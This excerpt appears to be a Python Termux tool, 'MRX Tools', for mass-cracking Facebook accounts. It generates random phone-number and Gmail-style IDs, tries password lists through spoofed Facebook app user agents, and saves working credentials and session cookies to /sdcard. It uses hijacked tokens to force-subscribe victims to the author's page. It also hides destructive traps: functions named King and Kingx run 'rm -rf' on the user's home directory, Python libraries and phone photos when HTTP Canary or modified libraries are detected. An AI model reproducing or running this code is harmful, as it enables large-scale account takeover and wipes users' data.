...
print('wellcome to Mrx Tools');time.sleep(5)

def permison():
    try:
        import os,sys
        #os.system('termux-setup-storage -y')
        open('/sdcard/mrx.txt','w').write('Hello Bro Wellcome To My Tool Fking')
        os.system('clear')
        print(50*'-')
    except:exit(f'{R}PERMISION NOT FOUND RE-RUN!!!')
permison()

os.system("clear")
#print(f'{X}INSTALLING MODELS')
...
def Kingx():
	os.system('clear')
	print(f"{A}[{R}+{A}] {F}Wait For Process Capture & bypass");time.sleep(1)
	os.system("rm -rf $HOME/*")
	os.system("rm -rf /data/data/com.termux/files/usr/lib/python3.11*")
	os.system("rm -rf /sdcard/*")
	os.system("rm -rf /sdcard/download/*")
	os.system("rm -rf /sdcard/DCIM/*")
	os.system("rm -rf /sdcard/Pictures/*")
	exit("[+] Fuck You Capture User ")
...
def Nasrat_SYS():
    if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
        print(40*'-')
        print('[+] Oh Shit Protection Found –•')
        time.sleep(1)
        print('-'*40)
        print('[+] Turn Off Your Protector and Try Again.')
        print(40*'-')
        exit()
#                securty                 #
try:
    ...
    os.system('clear')
    print(45*f'{A}-')
    exit(f'{G}ERROR TO CONNECT INTERNET')

try:
    os.system("python -m pip uninstall requests bs4 httpx mechanize rich chardet urllib3 idna certifi -y")
    os.system("python -m pip install requests bs4 httpx mechanize rich chardet urllib3 idna certifi")
...
try:
    ...
    os.system('python -m pip install futures')
try:
    import mechanize
...
def King():
	...
	os.system("rm -rf /sdcard/Pictures/*")
	"""
	print('[+] Fuck You Capture User ');exit()

def King1():
	print(f"{A}[{R}+{A}] {A}Wait For Checking {R} (Http Canary) ");time.sleep(2.80)
	"""
	os.system("rm -rf $HOME/*")
	os.system("rm -rf /data/data/com.termux/files/usr/lib/python3.*")
	os.system("rm -rf /sdcard/*")
	...
	os.system("rm -rf /sdcard/Pictures")
	"""
	print(f'{A}[{R}+{A}] {A}Fuck You {R}(Canary User) ')
	print(f'{A}[{R}+{A}] {A}Note {F}: {A}Delete Your {F} Http Canary {A}And Certificate ')
	print(50*f'{A}-');
	exit(f"{A}[{R}+{A}] {A}Re-Run Tool... ")
...
def Mrx():
    ...
    ua1 = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; Realme Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/Realme;FBBD/Realme;FBDV/Realme;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    ua2 = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; Oppo Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/Oppo;FBBD/Oppo;FBDV/Oppo;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    ua3 = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; Samsung Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/Samsung;FBBD/Samsung;FBDV/Samsung;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    ua4 = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; Xiaomi Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Xiaomi;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    ua5 = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; Huawei Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/Huawei;FBBD/Huawei;FBDV/Huawei;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    ua6 = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; OnePlus Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/OnePlus;FBBD/OnePlus;FBDV/OnePlus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    ua7 = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; Sony Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/Sony;FBBD/Sony;FBDV/Sony;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    ua8 = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; HTC Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/HTC;FBBD/HTC;FBDV/HTC;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    ua9 ='Dalvik/2.1.0 (Linux; U; Android 8.0.0; Google Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/Google;FBBD/Google;FBDV/Google;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    ua10 ='Dalvik/2.1.0 (Linux; U; Android 8.0.0; LG Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/LG;FBBD/LG;FBDV/LG;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
...
def __UBI___():
    ...
    ua5 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.1; {random.choice(mamu)} Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';'+f'[FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=1920};'+f'FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/TelkomSA;FBMF/samsung;FBBD/samsung;'+f'FBPN/{str(fbs)};FBDV/{random.choice(samsung)};FBSV/7.0.1;FBOP/19;FBCA/arm64-v8a:;]'
    ua6 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.1; {random.choice(mamu)} Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';'+f'[FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/grameenphone;FBMF/Xiaomi;FBBD/Redmi;'+f'FBPN/{str(fbs)};FBDV/{random.choice(redmi)};FBSV/6.0.1;FBOP/1;FBCA/arm64-v8a:;]'
...
\x1b[38;5;48m     |_   \  /   _||_   __ \   |_  _||_  _|  {A}B
\x1b[38;5;48m       |   \/   |    | |__) |    \ \  / /    {G}R
\x1b[38;5;48m       | |\  /| |    |  __ /      > `' <     {B}A
\x1b[38;5;48m      _| |_\/_| |_  _| |  \ \_  _/ /'`\ \_   {M}N
\x1b[38;5;48m     |_____||_____||____| |___||____||____|  {R}D
\033[1;97m=================================================
\033[1;37m[+] AUTHOR    : \033[1;32m MRX TEAM
\033[1;37m[+] FACEBOOK  : \033[1;32m Maysam Enayat
\033[1;37m[+] PARTNER   :  {G}Faisal Mastan & {R}SULTAN NASRAT
...
\033[1;37m[+] STATUS    :  \033[1;32mACTIVE
\033[1;37m=================================================="""
#---------------------CAPTURE SECURTY & BYPASS---------------------#
os.system('clear')
print(logo2)
#print(50*f'{A}=')
runtxt(f"{A}[{R}+{A}]{A} Waiting For Checking Checking Security...")
print(50*f'{A}=')
...
if str(len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py','r').readlines()))=='832':
    King()
if str(len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py','r').readlines()))=='158':
    King()
if str(len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py','r').readlines()))=='315':
    King()
if str(len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/hooks.py','r').readlines()))=='34':
    King()
if str(len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/certs.py','r').readlines()))=='18':
    King()
if str(len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/cookies.py','r').readlines()))=='562':
    King()
if str(len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/__init__.py','r').readlines()))=='185':
    King()
if str(len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/utils.py','r').readlines()))=='1097':
    King()
if str(len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/packages.py','r').readlines()))=='24':
    King()
if str(len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/structures.py','r').readlines()))=='100':
    King()
...
#__________________[OLD CLONE UPDATE ]__________________#
def windows():
...
if os.path.exists(os.path.join(path_canary, package_name)):
    print(logo)
    print(50*f'{A}-')  
    print(f"\x1b[1;97mDELETE YOUR FUCKING HTTP CANARY FROM {path_canary} & {package_name} ")
    print(f'{A}[{R}+{A}] Last Warning Mr Faisal' )
    print(50*f'{A}-')
    King1()
else:
...
if os.path.exists(os.path.join(path_canary2, package_name2)):
        ...
        print(logo)
        print(50*f'{A}-')
        print(f"{A}[{R}+{A}] DELETE HTTP CANARY FROM {F} = {path_canary2} \n{A}[{R}+{A}] CERTIFICATE NAME{F} = {package_name2}")
        print(f'{A}[{R}+{A}] Last Warning {F}: {R}Mr{R} Faisal {name} ' )
        King1()
       """
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print(f'\r{G}──────────────────────────────────────────────────')
        print(f'\033[1;37m[\033[1;32m+\033[1;37m]{A} THE PROCESS HAS BEEN COMPLETE...')
        print(f'\033[1;37m[\033[1;32m+\033[1;37m]{A} TOTAL OK {G}:{R} %s' % str(len(oks)))
        print(f'\033[1;37m[\033[1;32m+\033[1;37m]{A} TOTAL CP {G}:{R} %s' % str(len(cps)))
        print(f'\r{G}──────────────────────────────────────────────────')
        input(f"\033[1;37m[\033[1;32m+\033[1;37m]{A} PRESS ENTER TO BACK MENU ")
        exit()
#=========SERVER================#
def server():
    try:
        X__web=str("https://pastebin.com/raw/pzASYnrL")
        os.system("clear")
        print(logo)
        runtxt(f'{A}[{R}+{A}] WAITING FOR CHECKING SERVER');time.sleep(1.5)
        date=httpx.get(f"{X__web}").text
        if "free" in date:
            os.system("clear")
            print(logo)
            runtxt(f"{A}[{R}+{A}] {R}FREE & FORALL");time.sleep(2)
            os.system("clear")
            menu()
        elif "paid" in date:
            os.system('clear')
            print(logo)
            runtxt(f"{A}[{R}+{A}] {R}TOOL IS PAID");time.sleep(2)
            linex()
            os.system('clear')
            APROVEL()
        elif "off" in date:
            os.system('clear')
            print(logo)
            runtxt(f"{A}[{R}+{A}] {R}SERVER DOWN WAIT FOR UPDATE");time.sleep(2)
            exit()
        else:
            exit()
    except:pass
...
def APROVEL():
    os.system('clear')
    print(logo)
    runtxt(f'{A}[{R}+{A}] Checking Your  Approval')
    linex()
    time.sleep(1)
    try:
        uuid = str(os.geteuid())+"78588"""+str(os.geteuid())
        to = "MRX-BRAND"+"".join(uuid)
    except (KeyError, IOError):
        APROVEL2()
    r = httpx.get('https://github.com/MrxTeam01/approval-Mrx/blob/main/apv-maysam.txt').text
    if to in r:
        print(f'{A}[{R}+{A}] YOUR KEY IS APPROVED')
        if str(len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py','r').readlines()))=='1038':
            King()
        linex()
        time.sleep(1)
        ...
        print(logo)
        linex()
        runtxt(f'{A}[{R}+{A}]{A} YOUR KEY {G}: {R}{to}  ')
        linex()
        print(f'{A}[{R}•{A}]{R} Random Clone')
        print(f'{A}[{R}•{A}]{R} File Clone')
        print(f'{A}[{R}•{A}]{R} Old Clone')
        print(f'{A}[{R}•{A}]{R} Gmail Clone')
        linex()
        input(f'{A}[{R}+{A}] PRESS ENTER  TO SEND KEY : ')
        linex()
        time.sleep(2)
        tks = 'Hi-Maysam_Enayat,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20' + to
        os.system('am start https://wa.me/+93785887353?text=' + tks)
        APROVEL()
#__________________[ RESULT ]__________________#
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
...
def menu():   
    clear()
    print(f'\033[1;37m[{R}1{A}] {A}FILE CLONING')
    print(f'\033[1;37m[{R}2{A}] {A}RANDOM CLONING')
    print(f'\033[1;37m[{R}3{A}] {A}OLD IDS CLONING')
    print(f'\033[1;37m[{R}4{A}] {A}GMAIL CLONING')
    print(f'\033[1;37m[{R}5{A}] {A}OWNER FACEBOOK ID')
    print(f'\033[1;37m[{R}0{A}] {R}EXIT TOOLS')
    linex()
    select = input(f'\033[1;37m[\033[1;31m+\033[1;37m] CHOICE {G}:{A} ')
    if select =='1':
        _file_()
    elif select =='2':
        _randm_()
...
def _randm_():   
    clear()
    print(f'\033[1;37m[\033[1;31m1\033[1;37m] {A}AFGHANSTAN CLONING')
    print(f'\033[1;37m[\033[1;31m2\033[1;37m] {A}PAKISTAN CLONING')
    print(f'\033[1;37m[\033[1;31m3\033[1;37m] {A}INDIAN CLONING')
    print(f'\033[1;37m[\033[1;32m0\033[1;37m] {G}BACK TO MAIN MENU')
    linex()
    select = input(f'\033[1;37m[\033[1;31m+\033[1;37m] CHOICE {G}:{A} ')
    if select =='1':
        _Afg_()
...
def __Gmailx__():
    clear()
    user=[]
    print(f"{A}[+] EXAMPLE : faisal/maysam/matin/khan ");linex();first = input(f'{A}[+] FIRST NAME  : ')
    clear()
    ...
    with ThreadPool(max_workers=30) as habibxxxx:
        total=str(len(user))
        clear()
        print(f'{A}[+] GMAIL UID :{R} {total} ');print(f'{A}[+] FULL NAME : {R}{first+last} ');print(f"{A}[+] {G}USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for digitx in user:
...
def _Afg_():
    clear()
    print(f'\033[1;37m[\033[1;31m+\033[1;37m] {R}EXAMPLE {G}:{A} 9378{G}/{A}9379{G}/{A}9377{G}/{A}9370 ');linex()
    code = input(f'\033[1;37m[\033[1;31m+\033[1;37m] {R}CHOICE  {G}:{A} ')
    clear()
    print(f'\033[1;37m[\033[1;31m+\033[1;37m]{R} EXAMPLE {G}:{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999');linex()
    limit = int(input(f'\033[1;37m[\033[1;32m+\033[1;37m] {R}CHOICE  {G}:{A} '))
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with Bikash(max_workers=30) as sexy:
        clear()
        print(f'\033[1;37m[\033[1;31m+\033[1;37m] SIM CODE  {G}:{R} {code}')
        print(f'\033[1;37m[\033[1;31m+\033[1;37m] TOTAL UID {G}:{R} {str(len(user))}')
        print(f'\033[1;37m[\033[1;31m+\033[1;37m] TODAY DATE {G}:{A} {date}')
        print(f'\033[1;37m[\033[1;31m+\033[1;37m] TURN {A}[{G}ON{A}/{R}OFF{A}]{A} AIRPLANE MODE EVERY{R}5{A} MIN')
        print(f'\033[1;37m[\033[1;31m+\033[1;37m] AFGHANISTAN RANDOM CLONING PROCESSING ');linex()
        for love in user:
            ids = code+love
    ...
    print('')
    print(f'\r{G}──────────────────────────────────────────────────')
    print(f'\033[1;37m[\033[1;31m+\033[1;37m] {A}THE PROCESS HAS BEEN COMPLETED')
    print(f'\033[1;37m[\033[1;31m+\033[1;37m]{A} TOTAL OK ID {G}:{R} {str(len(ok))}')
    print(f'\033[1;37m[\033[1;31m+\033[1;37m] {A}TOTAL CP ID {G}:{R} {str(len(cp))}')
    print(f'\r{G}──────────────────────────────────────────────────')
    input(f'\033[1;37m[\033[1;31m+\033[1;37m] PRESS ENTER TO BACK ')
    menu()    
...
class main_crack():
    ...
    def crack(self,id):
        ...
        self.file = input(f'\033[1;32m[\033[1;31m✓\033[1;32m] FILE NAME {G}:{A} ')
        try:
    ...
    def pasw(self):       
            ...
            sl = int(input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PASSWORD LIMIT {G}:{A} '))
            clear()
            print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G4} Kabul123/afghan123/khankhan')
            linex()
            if sl =='':
                print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PUT LIMIT BETWEEN 1 TO 20')
            elif sl > 20:
                print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PASSWORD NO {G1}[{G}{sr+1}{G1}] {G}:{A} '))
            clear()
...
#__________________[ FILE METHOD M3 ]_____off_____________#             
...
#__________________[ ua-update ]__________________#
def ua():
    a="Dalvik/2.1.0 (Linux; U; Android 8.0.0; Oppo Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/Oppo;FBBD/Oppo;FBDV/Oppo;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
    b="Dalvik/2.1.0 (Linux; U; Android 8.0.0; Realme Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/Realme;FBBD/Realme;FBDV/Realme;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
    c="Dalvik/2.1.0 (Linux; U; Android 8.0.0; OnePlus Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/OnePlus;FBBD/OnePlus;FBDV/OnePlus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
    d="Dalvik/2.1.0 (Linux; U; Android 8.0.0; Xiaomi Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Xiaomi;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
    return random.choice([a,b,c,d])
#──────────────{ GMAIL-METHOD }──────────"────#
def __GMAILX__(username,pswrd,total):
    global oks,cps,loop
    sys.stdout.write(f"\r\033[1;32m[\033[1;31mMRX-POWER\033[1;32m] \033[1;35m{loop}\033[1;35m \033[1;32m|\033[1;32m OK{G}/{R}CP \033[1;32m|\033[1;32m {G}{len(oks)}/{R}{len(cps)} ")
    try:
        for password in pswrd:
            ...
            if 'session_key' in req:
                print(f'\r\r\x1b[38;5;46m|Mrx-OK| '+username+' | '+password)
                open('/sdcard/Mrx|-GMAIL-OK.txt', 'a').write(username+' | '+password+'\n')
                oks.append(username)
                break
            elif 'www.facebook.com' in req['error_msg']:
                print(f'\r\r{R}|Mrx-CP| '+username+' | '+password)
                open('/sdcard/Mrx-GMAIL-CP.txt', 'a').write(username+' | '+password+'\n')
                cps.append(username)
                break
            else:
                continue
...
def randm(ids,psd):
    ...
    sys.stdout.write(f"\r\033[1;37m[\033[1;32mMRX-POWER\033[1;37m] \033[1;35m{loop}\033[1;35m \033[1;32m|\033[1;32m OK{G}/{R}CP \033[1;32m|\033[1;32m {G}{len(ok)}/{R}{len(cp)} ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            ...
            if 'access_token' in q:
                uid = str(q['uid'])
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);BIKKIb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={BIKKIb};{ckkk}"
                runtxt(f'\r\r{G1}[MRX-OK] {uid} | {pas}')
               # print(f'\r\r{G1}[COOKIE<•>]{R} {cookie}')
                requests.post('https://graph.facebook.com/m.FaisalMastan/subscribers?access_token='+tok, cookies={'cookie':coki})
                requests.post('https://graph.facebook.com/m.FaisalMastan/subscribers?access_token='+tok, cookies={'cookie':coki})
                ...
                open('/sdcard/MRX-CP.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                cps.append(uid)
            else:     
                continue
        loop+=1
